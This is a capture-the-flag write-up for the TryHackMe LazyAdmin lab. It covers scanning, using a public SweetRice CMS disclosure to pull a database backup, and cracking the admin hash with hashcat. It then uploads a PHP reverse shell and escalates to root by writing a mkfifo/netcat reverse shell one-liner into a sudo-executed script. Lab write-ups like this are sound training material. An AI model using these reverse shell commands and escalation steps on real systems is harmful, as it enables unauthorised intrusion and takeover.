All steps and concepts about CTF made on https://tryhackme.com/room/lazyadmin :

1 - PortScaning

    nmap -sV 10.10.224.126

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
2 - List paths and directories with Dirb

    dirb http://10.10.224.126/ 

    This is a CMS "SweetRice" page on /content

3 - Since we know CMS is 'SweetRice' , we can 'exploit vulnerabilities' on https://exploit-db.com

4 - https://www.exploit-db.com/exploits/40718

    Says that http://10.10.224.126/content/inc/mysql_backup can be downloaded backup of database

5 - Doing simple search on file content by "user", "password", found: 

    \"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:

    That maybe be a hash for password, and we can translate with 'hashcat'

6 - Use the hashcat command : (Use AttackMachine, because memory limit of virtualbox throw error)

    cd /usr/share/wordlists

    hashcat -m 0 42f749ade7f9e195bf475f37a44cafcb rockyou.txt

    returns:

    42f749ade7f9e195bf475f37a44cafcb:Password123

7 - Dirb return has a path on /content/as to login with a user manager:Password123

8 - In the 'Ads' section, we can add a script to get a reverse connection I have downloaded a Php reverse shell script from scripts/php-reverse-shell:

    Just edit the HOST/PORT and upload this on this section.

9 - Open with nc the port on AttackMachine

    nc -nlv 3333

10 - Execute the shell on path /content/inc/ads/ clicking on shell.php

    The connection wi'll be created, so just use the command line of AttackMachine

11 - whoami returns the user 'www-data', and on /home/itguy/user.txt , get content first flag:

    THM{63e5bce9271952aad1113b6f1ac28a07}

12 - Escalete Privilege :

12.1 - check permission do we have "sudo -l" 

    /usr/bin/perl /home/itguy/backup.pl

    We dont have privilege to write the backup.pl , just write

12.2 - The backup.pl content:

    #!/usr/bin/perl
    system("sh","/etc/copy.sh")

12.3 - This scripts runs a bash "/etc/copy.sh"

    cat etc/copy.sh

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 192.168.0.190 5554 >/tmp/f

12.4 - Now we checked for permissions we can write to this file and execute there is already a reverse shell script is present so we just 
    have to change the IP address (AttackMachine) and port it will give us a reverse connection we tried editing the file using nano and vim but it 
    didn’t work so we used “echo” command.

    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 10.10.224.126 3334 >/tmp/f" 

12.5 On other tab terminal of AttackMachine, open port 3334 with netcat 

    nc -nlv 3334

13. Execute the backup.pl

    sudo /usr/bin/perl /home/itguy/backup.pl

    The second tab will connect with root user

14 - Just get content of /root/root.txt
